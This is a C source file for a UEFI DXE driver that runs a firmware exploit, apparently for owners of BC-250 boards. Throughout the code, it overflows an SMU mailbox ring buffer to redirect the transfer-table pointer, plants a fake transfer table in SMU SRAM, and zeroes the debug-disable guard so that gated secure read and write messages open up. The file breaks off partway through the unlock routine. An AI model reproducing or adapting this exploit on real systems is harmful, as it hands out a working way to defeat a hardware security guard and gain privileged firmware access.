/** @file
  BC250DXEv3SMUUnlockDxe.c

  DXE driver that performs rw-r-r-0644's BC-250 SMU secure-access unlock.

  This driver is a C port of the Python proof-of-concept maintained at
  https://github.com/rw-r-r-0644/bc250-smu-unlock.

  The unlock exploits the Queue 2 message 0x23 subqueue-ring append bug to
  redirect the SMU transfer-table pointer (SMN 0x19784), stages a fake
  transfer table in SMU-local SRAM through the ungated Q2 message 0x0A
  transfer-engine interface, and uses that table to zero the SMU debug-disable
  guard word at SMU-local 0x7B3C.  Once the guard is removed the gated Q3
  secure-access messages become callable and the SMU state is fixed up so that
  only the guard word differs from its boot-time value.

  Copyright (C) 2026 RescueMei
  SPDX-License-Identifier: MIT
**/

#include <Uefi.h>
#include <PiDxe.h>

#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/PciSegmentLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiRuntimeServicesTableLib.h>

#include <MeiMeiDXEv3MenuConfig.h>

//
// Host bridge PCI configuration-space offsets that expose the SMN indirect
// access window on the BC-250 root device (00:00.0).
//
#define BC250_HOST_PCI_SEGMENT      0
#define BC250_HOST_PCI_BUS          0
#define BC250_HOST_PCI_DEVICE       0
#define BC250_HOST_PCI_FUNCTION     0

#define SMN_INDEX_OFFSET            0xB8
#define SMN_DATA_OFFSET             0xBC

#define BC250_PCI_SEGMENT_ADDRESS(Offset) \
  PCI_SEGMENT_LIB_ADDRESS (BC250_HOST_PCI_SEGMENT, BC250_HOST_PCI_BUS, \
                           BC250_HOST_PCI_DEVICE, BC250_HOST_PCI_FUNCTION, (Offset))

//
// SMU mailbox register sets (SMN addresses).  (cmd, rsp, arg) triples taken
// from bc250_smu/api.py DEFAULT_QUEUE_ADDRS for queues 2 and 3.
//
#define Q2_CMD                      0x03B10528U
#define Q2_RSP                      0x03B10564U
#define Q2_ARG                      0x03B10998U

#define Q3_CMD                      0x03B10A20U
#define Q3_RSP                      0x03B10A80U
#define Q3_ARG                      0x03B10A88U

#define SMU_MAILBOX_ARGS            6U
#define SMU_MAILBOX_POLL_DELAY_US   1000U
//
// The mailbox timeout is expressed as a fixed iteration budget (1 ms stall per
// iteration) rather than a wall-clock deadline so that the driver does not
// depend on a functional TimerLib.  5000 iterations x 1 ms == a 5 s timeout.
//
#define SMU_MAILBOX_TIMEOUT_ITERATIONS  5000U

//
// SMU mailbox terminal response states (mailbox.py DONE set).
//
#define SMU_RETURN_OK               0x01U
#define SMU_RETURN_FAILED           0xFFU
#define SMU_RETURN_UNKNOWN_CMD      0xFEU
#define SMU_RETURN_REJECTED_PREREQ  0xFDU
#define SMU_RETURN_REJECTED_BUSY    0xFCU

//
// Queue 2 msg 0x23 subqueue-ring append bug (unlock.py / bc250_smu).
//
#define RING_BASE                   0x18850U
#define RING_ENTRY_SZ               16U
#define RING_SUBQ_SLOTS             30U
#define RING_CMD_TYPE(Cmd, SubQ)    (((Cmd) << 24) | (SubQ))

//
// Queue 2 msg 0x0A transfer-table state.
//
#define TR_TABLE_PTR                0x19784U
#define TR_TABLE_FAKE_RING_ENTRY    (TR_TABLE_PTR - 4U)
#define TR_TABLE_HDR_SZ             0x18U
#define TR_TABLE_ENTRY_HDR_SZ       4U

#define FAKE_ENTRY_KEY              0x13U
#define NEW_ENTRY_KEY               0x37U

//
// Q2 msg 0x0A transfer-engine sub-operation codes.
//
#define SUB_TR_SRAM_LOAD            0x1FU
#define SUB_TR_SMU2DMA              0x14U
#define SUB_TR_DMA2SMU              0x23U

//
// SMU-local SRAM addresses used by the unlock sequence.
//
#define DBG_DISABLE                 0x7B3CU
#define NEW_ENTRY_ADDR              0x7B38U
#define PROBE_ADDR                  0x0005A870U

//
// Q3 secure-access message opcodes.
//
#define Q3_MSG_TEST                 0x01U
#define Q3_MSG_SEC_SET_WRITE_PTR    0x28U
#define Q3_MSG_SEC_WRITE_THROUGH    0x29U
#define Q3_MSG_SEC_SMN_READ         0x2AU

#define TEST_MESSAGE_VALUE          0x5EED0000U

//
// SMU state fix-up table (unlock.py "fixup SMU state").
//
typedef struct {
  UINT32  Address;
  UINT32  Value;
} SMU_FIXUP_ENTRY;

STATIC CONST SMU_FIXUP_ENTRY  mFixupTable[] = {
  { 0x7B38U, 0x00000000U },
  { 0x19780U, 0x0003F794U },
  { 0x19784U, 0x0003E000U },
  { 0x19788U, 0x00000000U },
  { 0x1978CU, 0x00000000U },
  { 0x17E1CU, 0x00008B08U },
};

//
// Ring subqueue-4 append cursor.  unlock.py keeps this across invocations of
// overwrite_tr_table_ptr() because after the overflow the subqueue-4 counter
// sits at 2.
//
STATIC UINTN  mSubq4CurIdx = 0;

/**
  Read a 32-bit value from an SMN register through the host bridge PCI config
  index/data pair.

  @param[in] Register  SMN register address.

  @return 32-bit value read from the addressed SMN register.
**/
STATIC
UINT32
SmnRead32 (
  IN UINT32  Register
  )
{
  PciSegmentWrite32 (BC250_PCI_SEGMENT_ADDRESS (SMN_INDEX_OFFSET), Register);
  return PciSegmentRead32 (BC250_PCI_SEGMENT_ADDRESS (SMN_DATA_OFFSET));
}

/**
  Write a 32-bit value to an SMN register through the host bridge PCI config
  index/data pair.

  @param[in] Register  SMN register address.
  @param[in] Value     32-bit value to write.
**/
STATIC
VOID
SmnWrite32 (
  IN UINT32  Register,
  IN UINT32  Value
  )
{
  PciSegmentWrite32 (BC250_PCI_SEGMENT_ADDRESS (SMN_INDEX_OFFSET), Register);
  PciSegmentWrite32 (BC250_PCI_SEGMENT_ADDRESS (SMN_DATA_OFFSET), Value);
}

/**
  Return TRUE when the SMU queue response value is one of the terminal states.

  @param[in] Status  Raw SMU queue response register value.

  @retval TRUE   Status is a terminal response.
  @retval FALSE  Status is still busy or otherwise non-terminal.
**/
STATIC
BOOLEAN
IsDoneStatus (
  IN UINT32  Status
  )
{
  return (BOOLEAN)(Status == SMU_RETURN_OK ||
                    Status == SMU_RETURN_FAILED ||
                    Status == SMU_RETURN_UNKNOWN_CMD ||
                    Status == SMU_RETURN_REJECTED_PREREQ ||
                    Status == SMU_RETURN_REJECTED_BUSY);
}

/**
  Poll an SMU mailbox response register until a terminal status appears or a
  fixed iteration budget is exhausted.

  The polling loop is bounded by a fixed iteration count (1 ms stall per
  iteration) so the driver never depends on a functional TimerLib instance and
  can never hang indefinitely.

  @param[in]  RspAddr   SMN address of the queue response register.
  @param[out] Status    Last value observed in the response register.

  @retval EFI_SUCCESS  A terminal status was observed.
  @retval EFI_TIMEOUT  The queue never reached a terminal state in time.
**/
STATIC
EFI_STATUS
MailboxWaitDone (
  IN  UINT32  RspAddr,
  OUT UINT32  *Status
  )
{
  UINTN   Iterations;
  UINT32  Value;

  for (Iterations = 0; Iterations < SMU_MAILBOX_TIMEOUT_ITERATIONS; Iterations++) {
    Value = SmnRead32 (RspAddr);
    if (IsDoneStatus (Value)) {
      *Status = Value;
      return EFI_SUCCESS;
    }

    gBS->Stall (SMU_MAILBOX_POLL_DELAY_US);
  }

  *Status = SmnRead32 (RspAddr);
  return EFI_TIMEOUT;
}

/**
  Send one message through an SMU mailbox.

  This replicates Bc250Mailbox.send() from the reference Python package:
  clear the response register, write all six argument registers (zero-filling
  any slot beyond ArgCount), write the command, then wait for a terminal
  response.

  @param[in]  CmdAddr   SMN address of the queue command register.
  @param[in]  RspAddr   SMN address of the queue response register.
  @param[in]  ArgAddr   SMN address of the first queue argument register.
  @param[in]  MsgId     Message opcode.
  @param[in]  Args      Optional array of argument DWORDs (may be NULL when
                        ArgCount is zero).
  @param[in]  ArgCount  Number of DWORDs in Args (at most 6).
  @param[out] Status    Terminal response value.
  @param[out] Arg0      Value of the first argument register after completion.

  @retval EFI_SUCCESS  The queue reached a terminal state.
  @retval EFI_TIMEOUT  The queue never reached a terminal state in time.
**/
STATIC
EFI_STATUS
MailboxSend (
  IN  UINT32        CmdAddr,
  IN  UINT32        RspAddr,
  IN  UINT32        ArgAddr,
  IN  UINT32        MsgId,
  IN  CONST UINT32  *Args,
  IN  UINTN         ArgCount,
  OUT UINT32        *Status,
  OUT UINT32        *Arg0
  )
{
  UINTN  Index;

  if (ArgCount > SMU_MAILBOX_ARGS) {
    ArgCount = SMU_MAILBOX_ARGS;
  }

  SmnWrite32 (RspAddr, 0U);

  for (Index = 0; Index < SMU_MAILBOX_ARGS; Index++) {
    SmnWrite32 (ArgAddr + (UINT32)(4U * Index),
                ((Args != NULL) && (Index < ArgCount)) ? Args[Index] : 0U);
  }

  SmnWrite32 (CmdAddr, MsgId);

  if (EFI_ERROR (MailboxWaitDone (RspAddr, Status))) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: mailbox timeout (cmd 0x%02x, rsp 0x%05x)\n", MsgId, RspAddr));
    return EFI_TIMEOUT;
  }

  *Arg0 = SmnRead32 (ArgAddr);
  return EFI_SUCCESS;
}

/**
  Send a Queue 2 message.

  @param[in]  MsgId     Message opcode.
  @param[in]  Args      Optional array of argument DWORDs (may be NULL when
                        ArgCount is zero).
  @param[in]  ArgCount  Number of DWORDs in Args (at most 6).
  @param[out] Status    Terminal response value.
  @param[out] Arg0      Value of the first argument register after completion.

  @retval EFI_SUCCESS  The queue reached a terminal state.
  @retval EFI_TIMEOUT  The queue never reached a terminal state in time.
**/
STATIC
EFI_STATUS
Q2Send (
  IN  UINT32        MsgId,
  IN  CONST UINT32  *Args,
  IN  UINTN         ArgCount,
  OUT UINT32        *Status,
  OUT UINT32        *Arg0
  )
{
  return MailboxSend (Q2_CMD, Q2_RSP, Q2_ARG, MsgId, Args, ArgCount, Status, Arg0);
}

/**
  Send a Queue 3 message.

  @param[in]  MsgId     Message opcode.
  @param[in]  Args      Optional array of argument DWORDs (may be NULL when
                        ArgCount is zero).
  @param[in]  ArgCount  Number of DWORDs in Args (at most 6).
  @param[out] Status    Terminal response value.
  @param[out] Arg0      Value of the first argument register after completion.

  @retval EFI_SUCCESS  The queue reached a terminal state.
  @retval EFI_TIMEOUT  The queue never reached a terminal state in time.
**/
STATIC
EFI_STATUS
Q3Send (
  IN  UINT32        MsgId,
  IN  CONST UINT32  *Args,
  IN  UINTN         ArgCount,
  OUT UINT32        *Status,
  OUT UINT32        *Arg0
  )
{
  return MailboxSend (Q3_CMD, Q3_RSP, Q3_ARG, MsgId, Args, ArgCount, Status, Arg0);
}

/**
  Send a Queue 2 message and require a successful (0x01) SMU response.

  @param[in] MsgId     Message opcode.
  @param[in] Args      Array of argument DWORDs (may be NULL when ArgCount is zero).
  @param[in] ArgCount  Number of DWORDs in Args (at most 6).

  @retval EFI_SUCCESS       Message accepted by the SMU.
  @retval EFI_TIMEOUT       The queue never reached a terminal state in time.
  @retval EFI_DEVICE_ERROR  The SMU rejected the message.
**/
STATIC
EFI_STATUS
Q2SendChecked (
  IN UINT32        MsgId,
  IN CONST UINT32  *Args,
  IN UINTN         ArgCount
  )
{
  EFI_STATUS  Status;
  UINT32      MsgStatus;
  UINT32      Arg0;

  Status = Q2Send (MsgId, Args, ArgCount, &MsgStatus, &Arg0);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  if (MsgStatus != SMU_RETURN_OK) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: Q2 msg 0x%02x rejected, status=0x%02x\n", MsgId, MsgStatus));
    return EFI_DEVICE_ERROR;
  }

  return EFI_SUCCESS;
}

/**
  Send a Queue 3 message and require a successful (0x01) SMU response.

  @param[in] MsgId     Message opcode.
  @param[in] Args      Array of argument DWORDs (may be NULL when ArgCount is zero).
  @param[in] ArgCount  Number of DWORDs in Args (at most 6).

  @retval EFI_SUCCESS       Message accepted by the SMU.
  @retval EFI_TIMEOUT       The queue never reached a terminal state in time.
  @retval EFI_DEVICE_ERROR  The SMU rejected the message.
**/
STATIC
EFI_STATUS
Q3SendChecked (
  IN UINT32        MsgId,
  IN CONST UINT32  *Args,
  IN UINTN         ArgCount
  )
{
  EFI_STATUS  Status;
  UINT32      MsgStatus;
  UINT32      Arg0;

  Status = Q3Send (MsgId, Args, ArgCount, &MsgStatus, &Arg0);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  if (MsgStatus != SMU_RETURN_OK) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: Q3 msg 0x%02x rejected, status=0x%02x\n", MsgId, MsgStatus));
    return EFI_DEVICE_ERROR;
  }

  return EFI_SUCCESS;
}

/**
  Queue 2 msg 0x23: append one 16-byte entry to the subqueue ring.

  This is the append-bug primitive used to overflow the ring and redirect the
  subqueue-0 index counter (see OverwriteTrTablePtr()).

  @param[in] Arg0  First argument DWORD.
  @param[in] Arg1  Second argument DWORD.
  @param[in] Arg2  Third argument DWORD.
  @param[in] Arg3  Fourth argument DWORD (packed subqueue/command type).

  @retval EFI_SUCCESS       Entry accepted by the SMU.
  @retval EFI_TIMEOUT       The queue never reached a terminal state in time.
  @retval EFI_DEVICE_ERROR  The SMU rejected the append.
**/
STATIC
EFI_STATUS
Q2_0x23Append (
  IN UINT32  Arg0,
  IN UINT32  Arg1,
  IN UINT32  Arg2,
  IN UINT32  Arg3
  )
{
  UINT32  Args[4];

  Args[0] = Arg0;
  Args[1] = Arg1;
  Args[2] = Arg2;
  Args[3] = Arg3;

  return Q2SendChecked (0x23U, Args, 4);
}

/**
  Transfer-engine helper: send Q2 msg 0x0A with the given sub-op arguments.

  @param[in] Args  Array of up to 6 argument DWORDs (sub-op in Args[0]).

  @retval EFI_SUCCESS       Transfer accepted by the SMU.
  @retval EFI_TIMEOUT       The queue never reached a terminal state in time.
  @retval EFI_DEVICE_ERROR  The SMU rejected the transfer.
**/
STATIC
EFI_STATUS
TransferEngineSend (
  IN CONST UINT32  *Args,
  IN UINTN         ArgCount
  )
{
  return Q2SendChecked (0x0AU, Args, ArgCount);
}

/**
  Q2 msg 0x0A sub 0x14: DMA the transfer key slot to DRAM.

  @param[in] DstPhys  Physical DRAM destination address.
  @param[in] Words    Number of 32-bit words to transfer.

  @retval EFI_SUCCESS  Transfer accepted.
  @retval others       Transfer failed.
**/
STATIC
EFI_STATUS
TransferEngineSmu2Dram (
  IN UINT64  DstPhys,
  IN UINT32  Words
  )
{
  UINT32  Args[6];

  Args[0] = SUB_TR_SMU2DMA;
  Args[1] = (UINT32)(DstPhys >> 32);
  Args[2] = (UINT32)DstPhys;
  Args[3] = Words;
  Args[4] = 0U;
  Args[5] = 0U;

  return TransferEngineSend (Args, 6);
}

/**
  Q2 msg 0x0A sub 0x23: DMA DRAM into a transfer key slot.

  @param[in] SrcPhys  Physical DRAM source address.
  @param[in] Words    Number of 32-bit words to transfer.
  @param[in] Key      Transfer key value.

  @retval EFI_SUCCESS  Transfer accepted.
  @retval others       Transfer failed.
**/
STATIC
EFI_STATUS
TransferEngineDram2Smu (
  IN UINT64  SrcPhys,
  IN UINT32  Words,
  IN UINT32  Key
  )
{
  UINT32  Args[6];

  Args[0] = SUB_TR_DMA2SMU;
  Args[1] = (UINT32)(SrcPhys >> 32);
  Args[2] = (UINT32)SrcPhys;
  Args[3] = Words;
  Args[4] = 0U;
  Args[5] = Key;

  return TransferEngineSend (Args, 6);
}

/**
  Q3 msg 0x01: test message used to verify the SMU is alive.

  @retval TRUE   The SMU responded with the expected incremented value.
  @retval FALSE  The SMU did not respond correctly.
**/
STATIC
BOOLEAN
SmuAlive (
  VOID
  )
{
  EFI_STATUS  Status;
  UINT32      Args[1];
  UINT32      MsgStatus;
  UINT32      Arg0;

  Args[0] = TEST_MESSAGE_VALUE;

  Status = Q3Send (Q3_MSG_TEST, Args, 1, &MsgStatus, &Arg0);
  if (EFI_ERROR (Status)) {
    return FALSE;
  }

  if (MsgStatus != SMU_RETURN_OK) {
    return FALSE;
  }

  return (BOOLEAN)(Arg0 == (TEST_MESSAGE_VALUE + 1U));
}

/**
  Q3 msg 0x2A: secure 32-bit SMN read through the mem64 window.

  While the debug-disable guard is armed the SMU answers with
  SMU_RETURN_REJECTED_PREREQ (0xFD).

  @param[in]  SmuAddr SMN address to read.
  @param[out] Status  Raw SMU response status (may be a rejection code).
  @param[out] Value   Value read from the SMN address.

  @retval EFI_SUCCESS  The mailbox reached a terminal state.
  @retval EFI_TIMEOUT  The SMU did not respond in time.
**/
STATIC
EFI_STATUS
SecSmnRead32 (
  IN  UINT32  SmuAddr,
  OUT UINT32  *Status,
  OUT UINT32  *Value
  )
{
  UINT32  Args[1];

  Args[0] = SmuAddr;

  return Q3Send (Q3_MSG_SEC_SMN_READ, Args, 1, Status, Value);
}

/**
  Read 32-bit words from SMU-local SRAM using the ungated Q2 transfer engine.

  @param[in]  SmuAddr      SMU-local SRAM address.
  @param[in]  Words        Number of 32-bit words to read (18 max).
  @param[out] Buffer       Destination buffer (Words * 4 bytes).
  @param[in]  ScratchVa    Virtual address of the 4KB DMA scratch page.
  @param[in]  ScratchPhys  Physical address of the 4KB DMA scratch page.

  @retval EFI_SUCCESS  Data was copied into Buffer.
  @retval others       Transfer failed.
**/
STATIC
EFI_STATUS
SmuReadBytes (
  IN  UINT32  SmuAddr,
  IN  UINT32  Words,
  OUT VOID    *Buffer,
  IN  UINT8   *ScratchVa,
  IN  UINT64  ScratchPhys
  )
{
  EFI_STATUS  Status;
  UINT32      Args[6];

  //
  // transfer_engine_sram_load: SMU SRAM[SmuAddr] -> key slot
  //
  Args[0] = SUB_TR_SRAM_LOAD;
  Args[1] = 0U;
  Args[2] = SmuAddr;
  Args[3] = Words;

  Status = TransferEngineSend (Args, 4);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  //
  // transfer_engine_smu2dram: key slot -> DRAM[ScratchPhys]
  //
  Args[0] = SUB_TR_SMU2DMA;
  Args[1] = (UINT32)(ScratchPhys >> 32);
  Args[2] = (UINT32)ScratchPhys;
  Args[3] = Words;
  Args[4] = 0U;
  Args[5] = 0U;

  Status = TransferEngineSend (Args, 6);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  CopyMem (Buffer, ScratchVa, Words * 4U);
  return EFI_SUCCESS;
}

/**
  Write one 32-bit word to SMU-local SRAM through the now-unlocked Q3
  secure-access messages (0x28 set pointer, 0x29 write-through).

  @param[in] Addr   SMU-local SRAM address.
  @param[in] Value  32-bit value to write.

  @retval EFI_SUCCESS  Value was written.
  @retval others       Write failed.
**/
STATIC
EFI_STATUS
SmuWrite32 (
  IN UINT32  Addr,
  IN UINT32  Value
  )
{
  EFI_STATUS  Status;
  UINT32      Args[1];

  //
  // sec_set_write_ptr: point the write-through pointer at Addr.
  //
  Args[0] = Addr;
  Status = Q3SendChecked (Q3_MSG_SEC_SET_WRITE_PTR, Args, 1);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  //
  // sec_write_through32: 32-bit SMU-local store to the pointed address.
  //
  Args[0] = Value;
  Status = Q3SendChecked (Q3_MSG_SEC_WRITE_THROUGH, Args, 1);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  return EFI_SUCCESS;
}

/**
  Fill a range of SMU-local SRAM with a 32-bit value through the Q3
  secure-access write-through messages.

  @param[in] Addr   Starting SMU-local SRAM address.
  @param[in] Value  32-bit fill value.
  @param[in] Words  Number of 32-bit words to fill.

  @retval EFI_SUCCESS  Range was filled.
  @retval others       A write failed.
**/
STATIC
EFI_STATUS
SmuMemSet32 (
  IN UINT32  Addr,
  IN UINT32  Value,
  IN UINTN   Words
  )
{
  UINTN       Index;
  EFI_STATUS  Status;

  for (Index = 0; Index < Words; Index++) {
    Status = SmuWrite32 (Addr + (UINT32)(4U * Index), Value);
    if (EFI_ERROR (Status)) {
      return Status;
    }
  }

  return EFI_SUCCESS;
}

/**
  Overflow the Q2 msg 0x23 subqueue-4 ring to overwrite the transfer-table
  pointer with NewTablePtr.

  This is the append-ring bug from overwrite_tr_table_ptr() in unlock.py.
  After 30 (or 28, on the second invocation) harmless subqueue-4 appends the
  subqueue counters spill past the ring; the next subqueue-4 append carries
  arg0 = 243 so that the following subqueue-0 append lands at slot
  RING_BASE + 16 * 243 == TR_TABLE_PTR - 4 and its argument 2 overwrites the
  transfer-table pointer stored at SMN 0x19784.

  @param[in] NewTablePtr  New transfer-table pointer value (SMU-local SRAM).

  @retval EFI_SUCCESS  The transfer-table pointer was overwritten.
  @retval others       A ring append failed.
**/
STATIC
EFI_STATUS
OverwriteTrTablePtr (
  IN UINT32  NewTablePtr
  )
{
  UINTN       Index;
  UINTN       Pads;
  EFI_STATUS  Status;
  UINT32      PtrSlot;

  Pads         = RING_SUBQ_SLOTS - mSubq4CurIdx;
  mSubq4CurIdx = 2U;

  for (Index = 0; Index < Pads; Index++) {
    Status = Q2_0x23Append (0U, 0U, 0U, RING_CMD_TYPE (1U, 4U));
    if (EFI_ERROR (Status)) {
      return Status;
    }
  }

  PtrSlot = (UINT32)((TR_TABLE_FAKE_RING_ENTRY - RING_BASE) / RING_ENTRY_SZ);

  Status = Q2_0x23Append (PtrSlot, 0U, 0U, RING_CMD_TYPE (1U, 4U));
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = Q2_0x23Append (0U, 0U, NewTablePtr, RING_CMD_TYPE (1U, 1U));
  if (EFI_ERROR (Status)) {
    return Status;
  }

  return EFI_SUCCESS;
}

/**
  Return TRUE when every byte in Buffer is zero.

  @param[in] Buffer  Buffer to inspect.
  @param[in] Length  Number of bytes to inspect.

  @retval TRUE   All bytes are zero.
  @retval FALSE  At least one byte is non-zero.
**/
STATIC
BOOLEAN
IsAllZero (
  IN CONST UINT8  *Buffer,
  IN UINTN        Length
  )
{
  UINTN  Index;

  for (Index = 0; Index < Length; Index++) {
    if (Buffer[Index] != 0) {
      return FALSE;
    }
  }

  return TRUE;
}

/**
  Search SMU-local SRAM for the dead zone: the first 60-byte all-zero window
  below 0x7B20 used to stage the fake transfer table.

  This replicates the scan in unlock.py.  The accumulator buffer is built by
  prepending every newly read 72-byte chunk so that byte index
  (address - current_a) always resolves.

  @param[in]  ScratchVa    Virtual address of the 4KB DMA scratch page.
  @param[in]  ScratchPhys  Physical address of the 4KB DMA scratch page.
  @param[out] PValue       Dead-zone base address.
  @param[out] NValue       Number of DWORDs between the dead zone and 0x7B20.

  @retval EFI_SUCCESS       Dead zone located and validated.
  @retval EFI_NOT_FOUND     No dead zone below 0x7B20.
  @retval EFI_ABORTED       Dead zone geometry failed validation.
  @retval others            An SMU transfer failed.
**/
STATIC
EFI_STATUS
FindDeadZone (
  IN  UINT8   *ScratchVa,
  IN  UINT64  ScratchPhys,
  OUT UINT32  *PValue,
  OUT UINT32  *NValue
  )
{
  EFI_STATUS  Status;
  UINT8       *Buf;
  UINT32      Chunk[18];
  UINT32      a;
  UINT32      c;
  UINT32      StopC;
  UINT32      P;
  UINT32      N;
  UINTN       BufSize;
  BOOLEAN     Found;

  //
  // The scan reads 72-byte chunks from 0x7AF4 down to 0x306C (at most 266
  // chunks).  The accumulator must cover the whole span so earlier chunks
  // remain addressable while scanning from 0x7B1C downwards.
  //
  Buf = AllocatePool (266U * 72U);
  if (Buf == NULL) {
    return EFI_OUT_OF_RESOURCES;
  }

  BufSize = 0U;
  P       = 0U;
  Found   = FALSE;

  for (a = 0x7AF4U; ; a -= 0x48U) {
    Status = SmuReadBytes (a, 18U, Chunk, ScratchVa, ScratchPhys);
    if (EFI_ERROR (Status)) {
      FreePool (Buf);
      return Status;
    }

    CopyMem (Buf + 72U, Buf, BufSize);
    CopyMem (Buf, Chunk, sizeof (Chunk));
    BufSize += 72U;

    StopC = MAX (0x3070U, a + 0x1CU);
    for (c = 0x7B1CU; c >= StopC; c -= 4U) {
      if (IsAllZero (Buf + (UINTN)(c - 0x1CU - a), 0x3CU)) {
        P     = c;
        Found = TRUE;
        break;
      }
    }

    if (Found || (a <= 0x306CU)) {
      break;
    }
  }

  FreePool (Buf);

  if (!Found) {
    return EFI_NOT_FOUND;
  }

  N = (0x7B20U - P) / 4U;

  if ((P + 0x18U + 4U * N) != NEW_ENTRY_ADDR) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: dead-zone geometry invalid (P=0x%05x N=%d)\n", P, N));
    return EFI_ABORTED;
  }

  if ((N == 0U) || (N > 0xFFFFU)) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: dead-zone count out of range (P=0x%05x N=%d)\n", P, N));
    return EFI_ABORTED;
  }

  *PValue = P;
  *NValue = N;

  return EFI_SUCCESS;
}

/**
  Perform the SMU secure-access unlock sequence.

  This is a C port of _do_unlock() in unlock.py:

    1. verify the SMU is alive,
    2. probe the secure-access gate,
    3. read the debug-disable guard and fail out if already unlocked or if the
       SMU is in an unexpected state,
    4. locate a zero-filled dead zone below 0x7B20,
    5. stage a fake transfer table in DRAM,
    6. point the SMU transfer table at the dead zone and DMA the fake table
       into SMU SRAM (verifying it landed),
    7. re-arm the transfer table at the dead zone and DMA the zeroed count
       word so the final data word lands on the debug guard 0x7B3C,
    8. verify the gate is now open and the SMU is still alive,
    9. fix up the SMU state so only the guard word differs from boot.

  @param[in] PageVa    Virtual address of the 4KB staging/scratch page.
  @param[in] PagePhys  Physical address of the 4KB staging/scratch page.

  @retval EFI_SUCCESS       The SMU is unlocked (or was already unlocked).
  @retval EFI_ABORTED       Preconditions failed or the fake table did not land.
  @retval EFI_DEVICE_ERROR  The SMU is unresponsive or unlock verification failed.
  @retval others            An SMU message transfer failed.
**/
STATIC
EFI_STATUS
DoSmuUnlock (
  IN UINT8   *PageVa,
  IN UINT64  PagePhys
  )
{
  EFI_STATUS  Status;
  UINT32      Word;
  UINT8       DbgByte;
  UINT8       EntryByte;
  UINT32      DeadZoneP;
  UINT32      DeadZoneN;
  UINT32      RawGateStatus;
  UINT32      RawGateValue;
  UINT32      ProbeStatus;
  UINT32      ProbeValue;
  BOOLEAN     Alive;
  UINT8       FakeTable[32];
  UINTN       Index;

  //
  // 1. The SMU must be alive, otherwise the mailbox transactions below would
  //    never complete.
  //
  Alive = SmuAlive ();
  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: SMU alive=%d\n", Alive));
  if (!Alive) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: SMU not alive - cold power cycle required\n"));
    return EFI_DEVICE_ERROR;
  }

  //
  // 2. Probe the secure-access gate.  While the debug-disable guard is armed
  //    the gated Q3 msg 0x2A answers with 0xFD (REJECTED_PREREQ).
  //
  RawGateValue = 0U;
  Status = SecSmnRead32 (0U, &RawGateStatus, &RawGateValue);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: secure gate probe failed: %r\n", Status));
    return Status;
  }
  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: secure gate before=0x%02x (%a)\n",
          RawGateStatus,
          (RawGateStatus != SMU_RETURN_REJECTED_PREREQ) ? "open" : "closed"));

  //
  // 3. Read the debug guard and the new-entry position.  dbg == 0 means the
  //    SMU is already unlocked; a non-zero entry means the SMU is in an
  //    unexpected state and the exploit must not be run.
  //
  Word = 0U;
  Status = SmuReadBytes (DBG_DISABLE, 1U, &Word, PageVa, PagePhys);
  if (EFI_ERROR (Status)) {
    return Status;
  }
  DbgByte = (UINT8)Word;

  Word = 0U;
  Status = SmuReadBytes (NEW_ENTRY_ADDR, 1U, &Word, PageVa, PagePhys);
  if (EFI_ERROR (Status)) {
    return Status;
  }
  EntryByte = (UINT8)Word;

  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: dbg byte 0x%02x entry byte 0x%02x\n", DbgByte, EntryByte));

  if (DbgByte == 0U) {
    DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: already unlocked\n"));
    return EFI_SUCCESS;
  }

  if (EntryByte != 0U) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: unexpected SMU state - aborting\n"));
    return EFI_ABORTED;
  }

  //
  // 4. Locate the dead zone used to stage the transfer table.
  //
  Status = FindDeadZone (PageVa, PagePhys, &DeadZoneP, &DeadZoneN);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: dead-zone search failed: %r\n", Status));
    return Status;
  }
  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: P=0x%05x N=%d\n", DeadZoneP, DeadZoneN));

  //
  // 5. Stage the fake transfer table: header count 1, entry0 tag 0x13 with
  //    count N.  Layout matches fake_transfer_table in unlock.py.
  //
  ZeroMem (FakeTable, sizeof (FakeTable));
  ((UINT32 *)FakeTable)[0] = 1U;
  ((UINT32 *)FakeTable)[6] = FAKE_ENTRY_KEY | (DeadZoneN << 16);
  ((UINT32 *)FakeTable)[7] = 0U;
  CopyMem (PageVa, FakeTable, sizeof (FakeTable));

  //
  // 6. First pass: point the transfer table at the all-zero region
  //    (P - 0x1C).  Because that area is all zeros the SMU treats it as empty
  //    and allocates the next entry's data at E0 + 4 == P, which receives the
  //    fake table DMA'd from DRAM (key 3).  Read it back and verify.
  //
  Status = OverwriteTrTablePtr (DeadZoneP - 0x1CU);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = TransferEngineDram2Smu (PagePhys, 8U, 3U);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = TransferEngineSmu2Dram (PagePhys, 8U);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  {
    CONST UINT8  *Chk = (CONST UINT8 *)PageVa;
    UINT16        N16;

    if ((Chk[0] != 1U) || (Chk[0x18] != FAKE_ENTRY_KEY)) {
